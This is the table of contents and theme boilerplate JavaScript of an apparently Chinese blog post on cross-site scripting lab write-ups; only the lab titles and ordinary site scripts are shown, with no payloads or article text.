<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-site-scripting"><span class="toc-text">Cross-site scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded"><span class="toc-text">Lab: Reflected XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Stored-XSS-into-HTML-context-with-nothing-encoded"><span class="toc-text">Lab: Stored XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-document-write-sink-using-source-location-search"><span class="toc-text">Lab: DOM XSS in document.write sink using source location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search"><span class="toc-text">Lab: DOM XSS in innerHTML sink using source location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><span class="toc-text">Lab: DOM XSS in jQuery anchor href attribute sink using location.search source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><span class="toc-text">Lab: DOM XSS in jQuery selector sink using a hashchange event</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><span class="toc-text">Lab: Reflected XSS into attribute with angle brackets HTML-encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><span class="toc-text">Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><span class="toc-text">Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><span class="toc-text">Lab: DOM XSS in document.write sink using source location.search inside a select element</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-AngularJS-expression-with-angle-brackets-and-double-quotes-HTML-encoded"><span class="toc-text">Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-DOM-XSS"><span class="toc-text">Lab: Reflected DOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Stored-DOM-XSS"><span class="toc-text">Lab: Stored DOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked"><span class="toc-text">Lab: Reflected XSS into HTML context with most tags and attributes blocked</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones"><span class="toc-text">Lab: Reflected XSS into HTML context with all tags blocked except custom ones</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-with-some-SVG-markup-allowed"><span class="toc-text">Lab: Reflected XSS with some SVG markup allowed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-in-canonical-link-tag"><span class="toc-text">Lab: Reflected XSS in canonical link tag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped"><span class="toc-text">Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped"><span class="toc-text">Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped"><span class="toc-text">Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped"><span class="toc-text">Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Exploiting-cross-site-scripting-to-steal-cookies"><span class="toc-text">Lab: Exploiting cross-site scripting to steal cookies</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Exploiting-cross-site-scripting-to-capture-passwords"><span class="toc-text">Lab: Exploiting cross-site scripting to capture passwords</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Exploiting-XSS-to-bypass-CSRF-defenses"><span class="toc-text">Lab: Exploiting XSS to bypass CSRF defenses</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-with-AngularJS-sandbox-escape-without-strings"><span class="toc-text">Lab: Reflected XSS with AngularJS sandbox escape without strings</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-with-AngularJS-sandbox-escape-and-CSP"><span class="toc-text">Lab: Reflected XSS with AngularJS sandbox escape and CSP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-with-event-handlers-and-href-attributes-blocked"><span class="toc-text">Lab: Reflected XSS with event handlers and href attributes blocked</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked"><span class="toc-text">Lab: Reflected XSS in a JavaScript URL with some characters blocked</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E4%B8%89"><span class="toc-text">参数三</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%9B%9B%EF%BC%8C%E5%8F%82%E6%95%B0%E4%BA%94"><span class="toc-text">参数四，参数五</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%85%AD"><span class="toc-text">参数六</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-protected-by-very-strict-CSP-with-dangling-markup-attack"><span class="toc-text">Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-protected-by-CSP-with-CSP-bypass"><span class="toc-text">Lab: Reflected XSS protected by CSP, with CSP bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>
<script type="text/javascript">
  (() => {
    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
    for (const tagSwitcher of tagSwitchers) {
      tagSwitcher.addEventListener('click', (e) => {
        const parent = e.target.closest('.tag-subtree.parent-tag')
        parent.classList.toggle('expanded')
        e.preventDefault()
      })
    }

    // Get active tag from query string, then activate it.
    const urlParams = new URLSearchParams(window.location.search)
    const activeTag = urlParams.get('tag')
    if (activeTag) {
      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
      if (tag) {
        tag.querySelector('a').classList.add('active')
        
        while (tag) {
          tag.classList.add('expanded')
          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
        }
      }
    }
  })()
</script>


<!-- required -->
<script src="/js/main.js?v=1.29.1" defer></script>

<script type="text/javascript">
  const applyTheme = (theme) => {
    if (theme === 'auto') {
      document.documentElement.removeAttribute('data-theme')
    } else {
      document.documentElement.setAttribute('data-theme', theme)
    }

    applyThemeToGiscus(theme)
  }

  const applyThemeToGiscus = (theme) => {
    theme = theme === 'auto' ? 'preferred_color_scheme' : theme

    const cmt = document.getElementById('giscus')
    if (cmt) {
      // This works before giscus load.
      cmt.setAttribute('data-theme', theme)
    }

    const iframe = document.querySelector('#comments > section.giscus > iframe')
    if (iframe) {
      // This works after giscus loaded.
      const src = iframe.src
      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
      iframe.src = newSrc
    }
  }

  const switchTheme = () => {
    // light -> dark -> auto -> light -> ...
    const currentTheme = document.documentElement.getAttribute('data-theme')
    let newTheme;
    switch (currentTheme) {
      case 'light':
        newTheme = 'dark'
        break
      case 'dark':
        newTheme = 'auto'
        break
      default:
        newTheme = 'light'
    }
    applyTheme(newTheme)
    window.localStorage.setItem('Stellar.theme', newTheme)

    const messages = {
      light: `切换到浅色模式`,
      dark: `切换到深色模式`,
      auto: `切换到跟随系统配色`,
    }
    hud?.toast?.(messages[newTheme])
  }

  (() => {
    // Apply user's preferred theme, if any.
    const theme = window.localStorage.getItem('Stellar.theme')
    if (theme !== null) {
      applyTheme(theme)
    }
  })()
</script>


<!-- optional -->



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
